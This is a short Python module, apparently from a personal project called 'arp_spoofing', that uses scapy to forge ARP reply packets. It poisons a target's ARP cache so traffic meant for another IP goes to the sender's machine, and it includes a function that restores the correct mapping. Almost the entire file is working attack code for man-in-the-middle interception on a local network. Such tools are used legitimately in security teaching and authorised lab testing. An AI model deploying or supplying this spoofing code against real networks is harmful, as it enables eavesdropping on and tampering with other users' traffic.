# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                                                                          ║
# ║             ███╗   ███╗ █████╗  ██╗██╗      ██████╗  ██████╗             ║
# ║             ████╗ ████║██╔══██╗███║██║     ██╔═══██╗██╔════╝             ║
# ║             ██╔████╔██║███████║╚██║██║     ██║   ██║██║                  ║
# ║             ██║╚██╔╝██║██╔══██║ ██║██║     ██║   ██║██║                  ║
# ║             ██║ ╚═╝ ██║██║  ██║ ██║███████╗╚██████╔╝╚██████╗             ║
# ║             ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═╝╚══════╝ ╚═════╝  ╚═════╝             ║
# ║                                                                          ║
# ║    Project: arp_spoofing v1.0.0                                          ║
# ║    Created: 2025-05-22                                                   ║
# ║    Author: ma1loc (youness anflous)                                      ║
# ║                                                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from	scapy.all import ARP, send
from	rgb_msg import e_print
from	arp_utils import get_mac_addr
import	sys

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_addr(target_ip)
    if not target_mac:
        e_print(f"[-] Failed to get MAC for {target_ip}", newline=True)
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def	arp_restore(target_ip, spoof_ip):
    target_mac = get_mac_addr(target_ip)
    spoof_mac = get_mac_addr(spoof_ip)
    if not target_mac or not spoof_mac:
        e_print(f"[-] Failed to get MAC for {target_ip} or {spoof_ip}", newline=True)
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, verbose=False)
    